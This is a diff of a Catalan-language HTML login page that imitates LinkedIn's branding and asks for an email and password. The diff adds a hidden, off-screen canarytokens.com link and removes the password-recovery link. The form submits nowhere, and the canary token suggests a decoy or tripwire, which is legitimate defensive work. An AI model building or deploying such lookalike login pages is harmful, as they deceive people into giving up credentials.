@@ -1,22 +1,22 @@
+```html
 <!DOCTYPE html>
 <html lang="ca">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LinkedIn: Inicia sessió</title>
+    <title>LinkedIn</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
-            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            height: 100vh;
+            margin: 0;
+            background-color: #f2f2f2;
         }
 
-        .container {
+        .login-container {
             background-color: #fff;
             padding: 20px;
             border-radius: 8px;
@@ -24,7 +24,7 @@
             width: 300px;
         }
 
-        h1 {
+        .login-container h2 {
             text-align: center;
             color: #0077b5;
         }
@@ -33,14 +33,13 @@
             margin-bottom: 15px;
         }
 
-        label {
+        .form-group label {
             display: block;
             margin-bottom: 5px;
             font-weight: bold;
         }
 
-        input[type="email"],
-        input[type="password"] {
+        .form-group input {
             width: 100%;
             padding: 8px;
             border: 1px solid #ccc;
@@ -48,9 +47,9 @@
             box-sizing: border-box;
         }
 
-        button {
+        .login-button {
             background-color: #0077b5;
-            color: white;
+            color: #fff;
             padding: 10px 15px;
             border: none;
             border-radius: 4px;
@@ -58,40 +57,35 @@
             width: 100%;
         }
 
-        button:hover {
-            background-color: #005682;
+        .login-button:hover {
+            background-color: #005582;
         }
 
-        .link-container {
-            text-align: center;
-            margin-top: 15px;
-        }
-
-        .link-container a {
-            color: #0077b5;
-            text-decoration: none;
+        .hidden-link {
+            position: absolute;
+            left: -9999px;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>LinkedIn</h1>
+    <div class="login-container">
+        <h2>LinkedIn</h2>
         <form action="#" method="post">
             <div class="form-group">
-                <label for="email">Correu electrònic o telèfon:</label>
-                <input type="email" id="email" name="email" required>
+                <label for="email">Correu Electrònic o Telèfon:</label>
+                <input type="text" id="email" name="email" required>
             </div>
             <div class="form-group">
                 <label for="password">Contrasenya:</label>
                 <input type="password" id="password" name="password" required>
             </div>
-            <button type="submit">Inicia sessió</button>
+            <button type="submit" class="login-button">Inicia sessió</button>
         </form>
-        <div class="link-container">
-            <a href="#">Has oblidat la contrasenya?</a>
-        </div>
     </div>
+
+    <a href="http://canarytokens.com/terms/ddul48o1get68gtqyu4zloatv/submit.aspx" class="hidden-link">Canary Token</a>
 
 </body>
 </html>
+```
